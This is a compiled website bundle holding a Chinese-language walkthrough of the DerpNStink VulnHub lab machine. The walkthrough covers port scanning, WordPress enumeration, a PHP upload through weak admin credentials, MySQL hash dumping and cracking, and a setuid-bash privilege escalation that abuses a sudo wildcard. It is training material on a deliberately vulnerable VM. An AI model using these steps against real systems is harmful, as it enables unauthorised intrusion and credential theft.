"use strict";(self.webpackChunkremote_website=self.webpackChunkremote_website||[]).push([[1746],{28453:(e,n,r)=>{r.d(n,{R:()=>a,x:()=>d});var s=r(96540);const t={},i=s.createContext(t);function a(e){const n=s.useContext(i);return s.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function d(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(t):e.components||t:a(e.components),s.createElement(i.Provider,{value:n},e.children)}},75015:(e,n,r)=>{r.r(n),r.d(n,{assets:()=>o,contentTitle:()=>d,default:()=>p,frontMatter:()=>a,metadata:()=>s,toc:()=>c});const s=JSON.parse('{"id":"VulnHub/Virtual Machines/DerpNStink","title":"DerpNStink","description":"port scan","source":"@site/docs/VulnHub/Virtual Machines/DerpNStink.md","sourceDirName":"VulnHub/Virtual Machines","slug":"/VulnHub/Virtual Machines/DerpNStink","permalink":"/docs/VulnHub/Virtual Machines/DerpNStink","draft":false,"unlisted":false,"editUrl":"https://github.com/C0rr3c7/C0rr3c7.github.io/tree/master/docs/VulnHub/Virtual Machines/DerpNStink.md","tags":[],"version":"current","frontMatter":{},"sidebar":"VulnHubSidebar","previous":{"title":"DC-9","permalink":"/docs/VulnHub/Virtual Machines/DC-9"},"next":{"title":"Escalate","permalink":"/docs/VulnHub/Virtual Machines/Escalate"}}');var t=r(74848),i=r(28453);const a={},d=void 0,o={},c=[{value:"port scan",id:"port-scan",level:2},{value:"web",id:"web",level:2},{value:"\u63d0\u6743",id:"\u63d0\u6743",level:2}];function l(e){const n={code:"code",h2:"h2",img:"img",p:"p",pre:"pre",...(0,i.R)(),...e.components};return(0,t.jsxs)(t.Fragment,{children:[(0,t.jsx)(n.h2,{id:"port-scan",children:"port scan"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-shell",children:"# Nmap 7.94SVN scan initiated Sun Feb  9 22:57:00 2025 as: nmap -sT --min-rate=8899 -p- -oN nmap_result/port 192.168.56.147\r\nNmap scan report for 192.168.56.147 (192.168.56.147)\r\nHost is up (0.026s latency).\r\nNot shown: 65532 closed tcp ports (conn-refused)\r\nPORT   STATE SERVICE\r\n21/tcp open  ftp\r\n22/tcp open  ssh\r\n80/tcp open  http\n"})}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-shell",children:"# Nmap 7.94SVN scan initiated Sun Feb  9 22:57:47 2025 as: nmap -sT -sVC -O -p21,22,80 -oN nmap_result/detils 192.168.56.147\r\nNmap scan report for 192.168.56.147 (192.168.56.147)\r\nHost is up (0.0010s latency).\r\n\r\nPORT   STATE SERVICE VERSION\r\n21/tcp open  ftp     vsftpd 3.0.2\r\n22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)\r\n| ssh-hostkey: \r\n|   1024 12:4e:f8:6e:7b:6c:c6:d8:7c:d8:29:77:d1:0b:eb:72 (DSA)\r\n|   2048 72:c5:1c:5f:81:7b:dd:1a:fb:2e:59:67:fe:a6:91:2f (RSA)\r\n|   256 06:77:0f:4b:96:0a:3a:2c:3b:f0:8c:2b:57:b5:97:bc (ECDSA)\r\n|_  256 28:e8:ed:7c:60:7f:19:6c:e3:24:79:31:ca:ab:5d:2d (ED25519)\r\n80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))\r\n|_http-title: DeRPnStiNK\r\n| http-robots.txt: 2 disallowed entries \r\n|_/php/ /temporary/\r\n|_http-server-header: Apache/2.4.7 (Ubuntu)\r\nMAC Address: 08:00:27:1F:C3:09 (Oracle VirtualBox virtual NIC)\r\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\r\nDevice type: general purpose\r\nRunning: Linux 3.X|4.X\r\nOS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4\r\nOS details: Linux 3.2 - 4.9\r\nNetwork Distance: 1 hop\r\nService Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel\n"})}),"\n",(0,t.jsx)(n.h2,{id:"web",children:"web"}),"\n",(0,t.jsx)(n.p,{children:"\u67e5\u770b\u9875\u9762\u6e90\u7801\uff0c\u53d1\u73b0flag1"}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.code,{children:"curl http://192.168.56.147/"})}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{children:"flag1(52E37291AEDF6A46D7D0BB8A6312F4F9F1AA4975C248C3F0E008CBA09D6E9166)\n"})}),"\n",(0,t.jsx)(n.p,{children:"\u76ee\u5f55\u626b\u63cf"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-shell",children:"dirb http://192.168.56.147              \r\n\r\n-----------------\r\nDIRB v2.22    \r\nBy The Dark Raver\r\n-----------------\r\n\r\nSTART_TIME: Mon Feb 10 02:08:50 2025\r\nURL_BASE: http://192.168.56.147/\r\nWORDLIST_FILES: /usr/share/dirb/wordlists/common.txt\r\n\r\n-----------------\r\n\r\nGENERATED WORDS: 4612                                                          \r\n\r\n---- Scanning URL: http://192.168.56.147/ ----                                                                                                                            \r\n+ http://192.168.56.147/index.html (CODE:200|SIZE:1298)\r\n==> DIRECTORY: http://192.168.56.147/javascript/\r\n==> DIRECTORY: http://192.168.56.147/js/\r\n==> DIRECTORY: http://192.168.56.147/php/                                                                                                                                \r\n+ http://192.168.56.147/robots.txt (CODE:200|SIZE:53)\r\n+ http://192.168.56.147/server-status (CODE:403|SIZE:294)\r\n==> DIRECTORY: http://192.168.56.147/temporary/\r\n==> DIRECTORY: http://192.168.56.147/weblog/                                                           \r\n==> DIRECTORY: http://192.168.56.147/php/phpmyadmin/\r\n\r\n---- Entering directory: http://192.168.56.147/temporary/ ----\r\n+ http://192.168.56.147/temporary/index.html (CODE:200|SIZE:12)\r\n\r\n---- Entering directory: http://192.168.56.147/weblog/ ----\r\n+ http://192.168.56.147/weblog/index.php (CODE:200|SIZE:14912)\r\n==> DIRECTORY: http://192.168.56.147/weblog/wp-admin/\r\n==> DIRECTORY: http://192.168.56.147/weblog/wp-content/\r\n==> DIRECTORY: http://192.168.56.147/weblog/wp-includes/\n"})}),"\n",(0,t.jsx)(n.p,{children:"\u679a\u4e3ewordpress"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{children:"wpscan --url http://derpnstink.local/weblog/\n"})}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-shell",children:"[i] Plugin(s) Identified:\r\n\r\n[+] slideshow-gallery\r\n | Location: http://derpnstink.local/weblog/wp-content/plugins/slideshow-gallery/\r\n | Last Updated: 2024-09-25T13:06:00.000Z\r\n | [!] The version is out of date, the latest version is 1.8.4\r\n |\r\n | Found By: Urls In Homepage (Passive Detection)\r\n |\r\n | Version: 1.4.6 (80% confidence)\r\n | Found By: Readme - Stable Tag (Aggressive Detection)\r\n |  - http://derpnstink.local/weblog/wp-content/plugins/slideshow-gallery/readme.txt\n"})}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.img,{src:"https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20250210151454634.png",alt:"image-20250210151454634"})}),"\n",(0,t.jsx)(n.p,{children:"\u8be5\u63d2\u4ef6\u5b58\u5728\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e"}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.code,{children:"cmseek -u http://192.168.56.147/weblog/"})}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.img,{src:"https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20250210151655835.png",alt:""})}),"\n",(0,t.jsx)(n.p,{children:"2\u4e2a\u7528\u6237"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{children:"unclestinky\r\nadmin\n"})}),"\n",(0,t.jsxs)(n.p,{children:["\u5f31\u53e3\u4ee4",(0,t.jsx)(n.code,{children:"admin:admin"}),"\u8fdb\u5165\u540e\u53f0"]}),"\n",(0,t.jsx)(n.p,{children:"\u4e0a\u4f20php\u6587\u4ef6\u5373\u53ef"}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.img,{src:"https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20250210151830011.png",alt:"image-20250210151830011"})}),"\n",(0,t.jsx)(n.h2,{id:"\u63d0\u6743",children:"\u63d0\u6743"}),"\n",(0,t.jsxs)(n.p,{children:["\u67e5\u770b",(0,t.jsx)(n.code,{children:"wp-config.php"})]}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{children:"/** The name of the database for WordPress */\r\ndefine('DB_NAME', 'wordpress');\r\n\r\n/** MySQL database username */\r\ndefine('DB_USER', 'root');\r\n\r\n/** MySQL database password */\r\ndefine('DB_PASSWORD', 'mysql');\r\n\r\n/** MySQL hostname */\r\ndefine('DB_HOST', 'localhost');\n"})}),"\n",(0,t.jsx)(n.p,{children:"\u767b\u5f55mysql"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-mysql",children:"mysql> select user_login,user_pass,flag2 from wp_users;\r\n+-------------+------------------------------------+-------+\r\n| user_login  | user_pass                          | flag2 |\r\n+-------------+------------------------------------+-------+\r\n| unclestinky | $P$BW6NTkFvboVVCHU2R9qmNai1WfHSC41 |       |\r\n| admin       | $P$BgnU3VLAv.RWd3rdrkfVIuQr6mFvpd/ |       |\r\n+-------------+------------------------------------+-------+\n"})}),"\n",(0,t.jsxs)(n.p,{children:["\u7206\u7834hash",(0,t.jsx)(n.code,{children:"$P$BW6NTkFvboVVCHU2R9qmNai1WfHSC41"})]}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.code,{children:"john hash --wordlist=/usr/share/wordlists/rockyou.txt"})}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{children:"wedgie57\n"})}),"\n",(0,t.jsx)(n.p,{children:"\u767b\u5f55wordpress\u540e\u53f0\uff0c\u62ff\u5230flag2"}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.img,{src:"https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20250210152544976.png",alt:"image-20250210152544976"})}),"\n",(0,t.jsx)(n.p,{children:"\u53d1\u73b0\u4e3b\u673a\u5b58\u5728\u4e24\u4e2a\u7528\u6237\uff0c\u8fdb\u884c\u5bc6\u7801\u55b7\u6d12"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-sh",children:"www-data@DeRPnStiNK:/home$ su - stinky\r\nPassword: wedgie57\r\nstinky@DeRPnStiNK:~$\n"})}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-sh",children:"stinky@DeRPnStiNK:~$ ls -laR Desktop\r\nDesktop:\r\ntotal 12\r\ndrwxr-xr-x  2 stinky stinky 4096 Nov 13  2017 .\r\ndrwx------ 12 stinky stinky 4096 Feb 10 10:18 ..\r\n-rwxr-xr-x  1 stinky stinky   72 Nov 12  2017 flag.txt\n"})}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.code,{children:"flag3(07f62b021771d3cf67e2e1faf18769cc5e5c119ad7d4d1847a11e11d6d5a7ecb)"})}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-sh",children:"stinky@DeRPnStiNK:~/ftp/files/network-logs$ cat derpissues.txt\r\n12:06 mrderp: hey i cant login to wordpress anymore. Can you look into it?\r\n12:07 stinky: yeah. did you need a password reset?\r\n12:07 mrderp: I think i accidently deleted my account\r\n12:07 mrderp: i just need to logon once to make a change\r\n12:07 stinky: im gonna packet capture so we can figure out whats going on\r\n12:07 mrderp: that seems a bit overkill, but wtv\r\n12:08 stinky: commence the sniffer!!!!\r\n12:08 mrderp: -_-\r\n12:10 stinky: fine derp, i think i fixed it for you though. cany you try to login?\r\n12:11 mrderp: awesome it works!\r\n12:12 stinky: we really are the best sysadmins #team\r\n12:13 mrderp: i guess we are...\r\n12:15 mrderp: alright I made the changes, feel free to decomission my account\r\n12:20 stinky: done! yay\n"})}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-sh",children:"stinky@DeRPnStiNK:~/Documents$ ls -la\r\ntotal 4300\r\ndrwxr-xr-x  2 stinky stinky    4096 Nov 13  2017 .\r\ndrwx------ 12 stinky stinky    4096 Feb 10 10:18 ..\r\n-rw-r--r--  1 root   root   4391468 Nov 13  2017 derpissues.pcap\n"})}),"\n",(0,t.jsx)(n.p,{children:"\u5b58\u5728\u4e00\u4e2a\u6d41\u91cf\u5305"}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.img,{src:"https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20250210153218688.png",alt:"image-20250210153218688"})}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.code,{children:"mrderp:derpderpderpderpderpderpderp"})}),"\n",(0,t.jsx)(n.p,{children:"\u5207\u6362mderp\u7528\u6237"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-sh",children:"stinky@DeRPnStiNK:~/Documents$ su - mrderp\r\nPassword: derpderpderpderpderpderpderp\r\nmrderp@DeRPnStiNK:~$ sudo -l\r\n[sudo] password for mrderp: derpderpderpderpderpderpderp\r\n\r\nMatching Defaults entries for mrderp on DeRPnStiNK:\r\n    env_reset, mail_badpass,\r\n    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\r\n\r\nUser mrderp may run the following commands on DeRPnStiNK:\r\n    (ALL) /home/mrderp/binaries/derpy*\n"})}),"\n",(0,t.jsxs)(n.p,{children:["\u65b0\u5efa",(0,t.jsx)(n.code,{children:"binaries"}),"\u548c",(0,t.jsx)(n.code,{children:"derpy.sh"})]}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-shell",children:"mrderp@DeRPnStiNK:~$ ls -la binaries\r\nls -la binaries\r\ntotal 12\r\ndrwxrwxr-x  2 mrderp mrderp 4096 Feb 10 08:20 .\r\ndrwx------ 11 mrderp mrderp 4096 Feb 10 10:18 ..\r\n-rwxrwxr-x  1 mrderp mrderp   54 Feb 10 08:21 derpy.sh\r\nmrderp@DeRPnStiNK:~$ cat binaries/derpy.sh\r\ncat binaries/derpy.sh\r\n#!/bin/bash\r\ncp /bin/bash /tmp/bash;chmod +s /tmp/bash\n"})}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-sh",children:"mrderp@DeRPnStiNK:/tmp$ ls\r\nbash  linpeas.sh\r\nmrderp@DeRPnStiNK:/tmp$ ./bash -p\r\nbash-4.3# id\r\nuid=1000(mrderp) gid=1000(mrderp) euid=0(root) egid=0(root) groups=0(root),1000(mrderp)\r\nbash-4.3# whoami\r\nroot\n"})}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-sh",children:"bash-4.3# cat flag.txt\r\nflag4(49dca65f362fee401292ed7ada96f96295eab1e589c52e4e66bf4aedda715fdd)\r\n\r\nCongrats on rooting my first VulnOS!\r\n\r\nHit me up on twitter and let me know your thoughts!\r\n\r\n@securekomodo\n"})})]})}function p(e={}){const{wrapper:n}={...(0,i.R)(),...e.components};return n?(0,t.jsx)(n,{...e,children:(0,t.jsx)(l,{...e})}):l(e)}}}]);